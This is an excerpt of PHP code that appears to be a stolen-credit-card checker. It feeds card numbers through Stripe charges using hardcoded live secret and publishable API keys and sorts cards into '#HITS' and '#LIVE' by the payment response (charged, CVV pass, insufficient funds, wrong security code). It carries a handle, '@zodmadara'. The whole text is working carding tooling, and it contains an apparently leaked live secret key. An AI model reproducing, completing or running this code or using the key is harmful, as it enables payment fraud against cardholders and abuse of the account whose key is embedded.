...
$skArray = array(
    1 => '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',
);
...
$pkArray = array(
    1 => 'pk_live_51GvHxiAQZ1n8rx1ZjpXRx2JKkhkahDccHGKxm8Atedn5XSy5YzNqlUTERXPu87xLHB8S9REma3UidKfrnVG3cBmt00ZLUY6ioS',
);
...
if ($bins == $ban) {
    ...
    if (strpos($result2, '"seller_message": "Payment complete."')) {
        ...
        echo '<b>✅ #HITS</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>💰 Response:</b> $' . $amt . ' Charged ✅<br>🧾 <b>Receipt :</b> <a href=' . $receipturl . '>Get Receipt</a><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@zodmadara</b><br>';
    } elseif (strpos($result2, '"cvc_check": "pass"')) {
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🔒 Result:</b> CVV LIVE</span><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@zodmadara</b><br>';
        ...
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>💵 Result:</b> INSUFFICIENT FUNDS</span><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@zodmadara</b><br>';
        ...
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🔒 Result:</b> Security code is incorrect</span><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@zodmadara</b><br>';
        ...
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> TRANSACTION NOT ALLOWED</span><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@zodmadara</b><br>';
